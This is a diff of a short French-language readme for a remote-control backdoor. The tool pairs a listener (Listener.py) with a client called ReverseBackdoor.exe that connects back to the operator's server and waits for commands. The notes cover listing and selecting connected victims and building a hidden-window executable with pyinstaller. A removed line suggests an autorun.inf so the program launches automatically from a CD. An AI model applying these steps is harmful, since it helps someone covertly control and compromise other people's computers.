@@ -5,15 +5,14 @@
 
 doc pour le reverse : 
 
-on lance sur notre serveur le server.py et on attend que les clients se connecte  ( python3 server.py )
-on lance le client2.py qui se connecte au serveur et on attend les commandes
+on lance sur notre serveur le Listener.py et on attend que les clients se connecte  ( python3 server.py )
+on lance le ReverseBackdoor.exe qui se connecte au serveur et on attend les commandes
 
 
 
 pour lister les client sur le serveur on tape " list "
 pour selectionner le 3 eme client on tape select 3, pour quitter on tape quit
 
-le .exe peut être construit en tapant "python setup.py build"
+le .exe peut être construit en tapant "pyinstaller --onefile --windowed ReverseBackdoor.py"
 
-on a besoin d'avoir cx_Freeze ( python -m pip install cx_Freeze --upgrade )
-on peut créer un autorun.inf si on veut rendre automatique le programme sur un cd et donner un logo à l'executable
+
